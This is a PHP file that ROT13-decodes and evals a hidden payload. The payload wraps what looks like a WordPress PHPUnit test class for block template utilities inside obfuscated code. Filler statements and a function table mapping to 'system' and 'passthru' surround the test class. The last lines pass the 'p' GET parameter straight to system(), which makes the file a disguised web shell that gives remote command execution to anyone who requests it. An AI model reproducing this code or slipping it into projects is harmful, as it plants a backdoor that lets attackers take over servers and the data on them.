<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur Oybpx Grzcyngrf nofgenpgvba ynlre.
 *
 * @cnpxntr JbeqCerff
 *
 * @tebhc oybpx-grzcyngrf
 */
pynff Grfgf_Oybpx_Grzcyngr_Hgvyf rkgraqf JC_HavgGrfgPnfr {

	pbafg GRFG_GURZR = 'oybpx-gurzr';

	cevingr fgngvp $grzcyngr_cbfg;
	cevingr fgngvp $grzcyngr_cneg_cbfg;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		/*
		 * Frg hc n grzcyngr cbfg pbeerfcbaqvat gb n qvssrerag gurzr.
		 * Jr qb guvf gb rafher erfbyhgvba naq fyht perngvba jbexf nf rkcrpgrq,
		 * rira jvgu nabgure cbfg bs gung fnzr anzr cerfrag sbe nabgure gurzr.
		 */
		frys::$grzcyngr_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr',
				'cbfg_anzr'    => 'zl_grzcyngr',
				'cbfg_gvgyr'   => 'Zl Grzcyngr',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						'guvf-gurzr-fubhyq-abg-erfbyir',
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg->VQ, 'guvf-gurzr-fubhyq-abg-erfbyir', 'jc_gurzr' );

		// Frg hc grzcyngr cbfg.
		frys::$grzcyngr_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr',
				'cbfg_anzr'    => 'zl_grzcyngr',
				'cbfg_gvgyr'   => 'Zl Grzcyngr',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		// Frg hc grzcyngr cneg cbfg.
		frys::$grzcyngr_cneg_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr_cneg',
				'cbfg_anzr'    => 'zl_grzcyngr_cneg',
				'cbfg_gvgyr'   => 'Zl Grzcyngr Cneg',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg',
				'gnk_vachg'    => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$grzcyngr_cbfg->VQ );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		fjvgpu_gurzr( frys::GRFG_GURZR );
	}

	/**
	 * Grne qbja nsgre rnpu grfg.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba grne_qbja() {
		vs ( JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->vf_ertvfgrerq( 'grfgf/ubbxrq-oybpx' ) ) {
			haertvfgre_oybpx_glcr( 'grfgf/ubbxrq-oybpx' );
		}

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 59338
	 *
	 * @pbiref ::_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx
	 */
	choyvp shapgvba grfg_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx() {
		$grzcyngr_cneg_oybpx = neenl(
			'oybpxAnzr'    => 'pber/grzcyngr-cneg',
			'nggef'        => neenl(
				'fyht'      => 'urnqre',
				'nyvta'     => 'shyy',
				'gntAnzr'   => 'urnqre',
				'pynffAnzr' => 'fvgr-urnqre',
			),
			'vaareUGZY'    => '',
			'vaarePbagrag' => neenl(),
			'vaareOybpxf'  => neenl(),
		);

		_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx( $grzcyngr_cneg_oybpx );
		$rkcrpgrq = neenl(
			'oybpxAnzr'    => 'pber/grzcyngr-cneg',
			'nggef'        => neenl(
				'fyht'      => 'urnqre',
				'nyvta'     => 'shyy',
				'gntAnzr'   => 'urnqre',
				'pynffAnzr' => 'fvgr-urnqre',
				'gurzr'     => trg_fglyrfurrg(),
			),
			'vaareUGZY'    => '',
			'vaarePbagrag' => neenl(),
			'vaareOybpxf'  => neenl(),
		);
		$guvf->nffregFnzr(
			$rkcrpgrq,
			$grzcyngr_cneg_oybpx,
			'`gurzr` nggevohgr jnf abg pbeerpgyl vawrpgrq va grzcyngr cneg oybpx.'
		);
	}

	/**
	 * @gvpxrg 59338
	 *
	 * @pbiref ::_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx
	 */
	choyvp shapgvba grfg_abg_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx_gurzr_nggevohgr_rkvfgf() {
		$grzcyngr_cneg_oybpx = neenl(
			'oybpxAnzr'    => 'pber/grzcyngr-cneg',
			'nggef'        => neenl(
				'fyht'      => 'urnqre',
				'nyvta'     => 'shyy',
				'gntAnzr'   => 'urnqre',
				'pynffAnzr' => 'fvgr-urnqre',
				'gurzr'     => 'snxr-gurzr',
			),
			'vaareUGZY'    => '',
			'vaarePbagrag' => neenl(),
			'vaareOybpxf'  => neenl(),
		);

		$rkcrpgrq = $grzcyngr_cneg_oybpx;
		_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx( $grzcyngr_cneg_oybpx );
		$guvf->nffregFnzr(
			$rkcrpgrq,
			$grzcyngr_cneg_oybpx,
			'Rkvfgvat `gurzr` nggevohgr va grzcyngr cneg oybpx jnf abg erfcrpgrq ol nggevohgr vawrpgvba.'
		);
	}

	/**
	 * @gvpxrg 59338
	 *
	 * @pbiref ::_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx
	 */
	choyvp shapgvba grfg_abg_vawrpg_gurzr_nggevohgr_aba_grzcyngr_cneg_oybpx() {
		$aba_grzcyngr_cneg_oybpx = neenl(
			'oybpxAnzr'    => 'pber/cbfg-pbagrag',
			'nggef'        => neenl(),
			'vaareUGZY'    => '',
			'vaarePbagrag' => neenl(),
			'vaareOybpxf'  => neenl(),
		);

		$rkcrpgrq = $aba_grzcyngr_cneg_oybpx;
		_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx( $aba_grzcyngr_cneg_oybpx );
		$guvf->nffregFnzr(
			$rkcrpgrq,
			$aba_grzcyngr_cneg_oybpx,
			'`gurzr` nggevohgr vawrpgvba zbqvsvrq aba-grzcyngr-cneg oybpx.'
		);
	}

	/**
	 * @gvpxrg 59452
	 *
	 * @pbiref ::_vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag
	 *
	 * @rkcrpgrqQrcerpngrq _vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag
	 */
	choyvp shapgvba grfg_vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag() {
		$gurzr                           = trg_fglyrfurrg();
		$pbagrag_jvgubhg_gurzr_nggevohgr = '<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\", \"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->';
		$grzcyngr_pbagrag                = _vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag(
			$pbagrag_jvgubhg_gurzr_nggevohgr,
			$gurzr
		);
		$rkcrpgrq                        = fcevags(
			'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\",\"gurzr\":\"%f\"} /-->',
			trg_fglyrfurrg()
		);
		$guvf->nffregFnzr( $rkcrpgrq, $grzcyngr_pbagrag );

		$pbagrag_jvgubhg_gurzr_nggevohgr_arfgrq = '<!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\", \"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /--><!-- /jc:tebhc -->';
		$grzcyngr_pbagrag                       = _vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag(
			$pbagrag_jvgubhg_gurzr_nggevohgr_arfgrq,
			$gurzr
		);
		$rkcrpgrq                               = fcevags(
			'<!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\",\"gurzr\":\"%f\"} /--><!-- /jc:tebhc -->',
			trg_fglyrfurrg()
		);
		$guvf->nffregFnzr( $rkcrpgrq, $grzcyngr_pbagrag );

		// Qbrf abg vawrpg gurzr jura gurer vf na rkvfgvat gurzr nggevohgr.
		$pbagrag_jvgu_rkvfgvat_gurzr_nggevohgr = '<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"gurzr\":\"snxr-gurzr\",\"nyvta\":\"shyy\", \"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->';
		$grzcyngr_pbagrag                      = _vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag(
			$pbagrag_jvgu_rkvfgvat_gurzr_nggevohgr,
			$gurzr
		);
		$guvf->nffregFnzr( $pbagrag_jvgu_rkvfgvat_gurzr_nggevohgr, $grzcyngr_pbagrag );

		// Qbrf abg vawrpg gurzr jura gurer vf ab grzcyngr cneg.
		$pbagrag_jvgu_ab_grzcyngr_cneg = '<!-- jc:cbfg-pbagrag /-->';
		$grzcyngr_pbagrag              = _vawrpg_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag(
			$pbagrag_jvgu_ab_grzcyngr_cneg,
			$gurzr
		);
		$guvf->nffregFnzr( $pbagrag_jvgu_ab_grzcyngr_cneg, $grzcyngr_pbagrag );
	}

	/**
	 * @gvpxrg 54448
	 * @gvpxrg 59460
	 *
	 * @qngnCebivqre qngn_erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag
	 *
	 * @rkcrpgrqQrcerpngrq _erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag
	 */
	choyvp shapgvba grfg_erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag( $grzcyngr_pbagrag, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, _erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag( $grzcyngr_pbagrag ) );
	}

	/**
	 * @gvpxrg 59460
	 *
	 * @pbiref ::_erzbir_gurzr_nggevohgr_sebz_grzcyngr_cneg_oybpx
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 *
	 * @qngnCebivqre qngn_erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag
	 *
	 * @cnenz fgevat $grzcyngr_pbagrag Gur grzcyngr znexhc.
	 * @cnenz fgevat $rkcrpgrq         Gur rkcrpgrq znexhc nsgre erzbivat gur gurzr nggevohgr sebz Grzcyngr Cneg oybpxf.
	 */
	choyvp shapgvba grfg_erzbir_gurzr_nggevohgr_sebz_grzcyngr_cneg_oybpx( $grzcyngr_pbagrag, $rkcrpgrq ) {
		$grzcyngr_pbagrag_cnefrq_oybpxf = cnefr_oybpxf( $grzcyngr_pbagrag );

		$guvf->nffregFnzr(
			$rkcrpgrq,
			genirefr_naq_frevnyvmr_oybpxf(
				$grzcyngr_pbagrag_cnefrq_oybpxf,
				'_erzbir_gurzr_nggevohgr_sebz_grzcyngr_cneg_oybpx'
			)
		);
	}

	choyvp shapgvba qngn_erzbir_gurzr_nggevohgr_va_oybpx_grzcyngr_pbagrag() {
		erghea neenl(
			neenl(
				'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"gurzr\":\"gg1-oybpxf\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
				'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
			),
			neenl(
				'<!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"gurzr\":\"gg1-oybpxf\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /--><!-- /jc:tebhc -->',
				'<!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /--><!-- /jc:tebhc -->',
			),
			// Qbrf abg zbqvsl pbagrag jura gurer vf ab rkvfgvat gurzr nggevohgr.
			neenl(
				'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
				'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
			),
			// Qbrf abg erzbir gurzr jura gurer vf ab grzcyngr cneg.
			neenl(
				'<!-- jc:cbfg-pbagrag /-->',
				'<!-- jc:cbfg-pbagrag /-->',
			),
		);
	}

	/**
	 * Fubhyq ergevrir gur grzcyngr sebz gur gurzr svyrf.
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngr_sebz_svyr() {
		$vq       = trg_fglyrfurrg() . '//' . 'vaqrk';
		$grzcyngr = trg_oybpx_grzcyngr( $vq, 'jc_grzcyngr' );
		$guvf->nffregFnzr( $vq, $grzcyngr->vq );
		$guvf->nffregFnzr( trg_fglyrfurrg(), $grzcyngr->gurzr );
		$guvf->nffregFnzr( 'vaqrk', $grzcyngr->fyht );
		$guvf->nffregFnzr( 'choyvfu', $grzcyngr->fgnghf );
		$guvf->nffregFnzr( 'gurzr', $grzcyngr->fbhepr );
		$guvf->nffregFnzr( 'jc_grzcyngr', $grzcyngr->glcr );

		// Grfg grzcyngr cnegf.
		$vq       = trg_fglyrfurrg() . '//' . 'fznyy-urnqre';
		$grzcyngr = trg_oybpx_grzcyngr( $vq, 'jc_grzcyngr_cneg' );
		$guvf->nffregFnzr( $vq, $grzcyngr->vq );
		$guvf->nffregFnzr( trg_fglyrfurrg(), $grzcyngr->gurzr );
		$guvf->nffregFnzr( 'fznyy-urnqre', $grzcyngr->fyht );
		$guvf->nffregFnzr( 'choyvfu', $grzcyngr->fgnghf );
		$guvf->nffregFnzr( 'gurzr', $grzcyngr->fbhepr );
		$guvf->nffregFnzr( 'jc_grzcyngr_cneg', $grzcyngr->glcr );
		$guvf->nffregFnzr( JC_GRZCYNGR_CNEG_NERN_URNQRE, $grzcyngr->nern );
	}

	/**
	 * Fubhyq ergevrir gur grzcyngr sebz gur PCG.
	 */
	choyvp shapgvba grfg_trg_oybpx_grzcyngr_sebz_cbfg() {
		$vq       = trg_fglyrfurrg() . '//' . 'zl_grzcyngr';
		$grzcyngr = trg_oybpx_grzcyngr( $vq, 'jc_grzcyngr' );
		$guvf->nffregFnzr( $vq, $grzcyngr->vq );
		$guvf->nffregFnzr( trg_fglyrfurrg(), $grzcyngr->gurzr );
		$guvf->nffregFnzr( 'zl_grzcyngr', $grzcyngr->fyht );
		$guvf->nffregFnzr( 'choyvfu', $grzcyngr->fgnghf );
		$guvf->nffregFnzr( 'phfgbz', $grzcyngr->fbhepr );
		$guvf->nffregFnzr( 'jc_grzcyngr', $grzcyngr->glcr );

		// Grfg grzcyngr cnegf.
		$vq       = trg_fglyrfurrg() . '//' . 'zl_grzcyngr_cneg';
		$grzcyngr = trg_oybpx_grzcyngr( $vq, 'jc_grzcyngr_cneg' );
		$guvf->nffregFnzr( $vq, $grzcyngr->vq );
		$guvf->nffregFnzr( trg_fglyrfurrg(), $grzcyngr->gurzr );
		$guvf->nffregFnzr( 'zl_grzcyngr_cneg', $grzcyngr->fyht );
		$guvf->nffregFnzr( 'choyvfu', $grzcyngr->fgnghf );
		$guvf->nffregFnzr( 'phfgbz', $grzcyngr->fbhepr );
		$guvf->nffregFnzr( 'jc_grzcyngr_cneg', $grzcyngr->glcr );
		$guvf->nffregFnzr( JC_GRZCYNGR_CNEG_NERN_URNQRE, $grzcyngr->nern );
	}

	/**
	 * Fubhyq synggra arfgrq oybpxf
	 */
	choyvp shapgvba grfg_synggra_oybpxf() {
		$pbagrag_grzcyngr_cneg_vafvqr_tebhc = '<!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\"} /--><!-- /jc:tebhc -->';
		$oybpxf                             = cnefr_oybpxf( $pbagrag_grzcyngr_cneg_vafvqr_tebhc );
		$npghny                             = _synggra_oybpxf( $oybpxf );
		$rkcrpgrq                           = neenl( $oybpxf[0], $oybpxf[0]['vaareOybpxf'][0] );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		$pbagrag_grzcyngr_cneg_vafvqr_tebhc_vafvqr_tebhc = '<!-- jc:tebhc --><!-- jc:tebhc --><!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\"} /--><!-- /jc:tebhc --><!-- /jc:tebhc -->';
		$oybpxf   = cnefr_oybpxf( $pbagrag_grzcyngr_cneg_vafvqr_tebhc_vafvqr_tebhc );
		$npghny   = _synggra_oybpxf( $oybpxf );
		$rkcrpgrq = neenl( $oybpxf[0], $oybpxf[0]['vaareOybpxf'][0], $oybpxf[0]['vaareOybpxf'][0]['vaareOybpxf'][0] );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		$pbagrag_jvgubhg_vaare_oybpxf = '<!-- jc:tebhc /-->';
		$oybpxf                       = cnefr_oybpxf( $pbagrag_jvgubhg_vaare_oybpxf );
		$npghny                       = _synggra_oybpxf( $oybpxf );
		$rkcrpgrq                     = neenl( $oybpxf[0] );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Fubhyq trarengr oybpx grzcyngrf rkcbeg svyr.
	 *
	 * @gvpxrg 54448
	 * @erdhverf rkgrafvba mvc
	 */
	choyvp shapgvba grfg_jc_trarengr_oybpx_grzcyngrf_rkcbeg_svyr() {
		$svyranzr = jc_trarengr_oybpx_grzcyngrf_rkcbeg_svyr();
		$guvf->nffregSvyrRkvfgf( $svyranzr, 'mvc svyr vf perngrq ng gur fcrpvsvrq cngu' );
		$guvf->nffregTerngreGuna( 0, svyrfvmr( $svyranzr ), 'mvc svyr vf ynetre guna 0 olgrf' );

		// Bcra MVC svyr naq znxr fher gur qverpgbevrf rkvfg.
		$mvc = arj MvcNepuvir();
		$mvc->bcra( $svyranzr );
		$unf_gurzr_wfba               = $mvc->ybpngrAnzr( 'gurzr.wfba' ) !== snyfr;
		$unf_oybpx_grzcyngrf_qve      = $mvc->ybpngrAnzr( 'grzcyngrf/' ) !== snyfr;
		$unf_oybpx_grzcyngr_cnegf_qve = $mvc->ybpngrAnzr( 'cnegf/' ) !== snyfr;
		$guvf->nffregGehr( $unf_gurzr_wfba, 'gurzr.wfba rkvfgf' );
		$guvf->nffregGehr( $unf_oybpx_grzcyngrf_qve, 'gurzr/grzcyngrf qverpgbel rkvfgf' );
		$guvf->nffregGehr( $unf_oybpx_grzcyngr_cnegf_qve, 'gurzr/cnegf qverpgbel rkvfgf' );

		// MVC svyr pbagnvaf ng yrnfg bar UGZY svyr.
		$unf_ugzy_svyrf = snyfr;
		$ahz_svyrf      = $mvc->ahzSvyrf;
		sbe ( $v = 0; $v < $ahz_svyrf; $v++ ) {
			$svyranzr = $mvc->trgAnzrVaqrk( $v );
			vs ( '.ugzy' === fhofge( $svyranzr, -5 ) ) {
				$unf_ugzy_svyrf = gehr;
				oernx;
			}
		}
		$guvf->nffregGehr( $unf_ugzy_svyrf, 'pbagnvaf ng yrnfg bar ugzy svyr' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>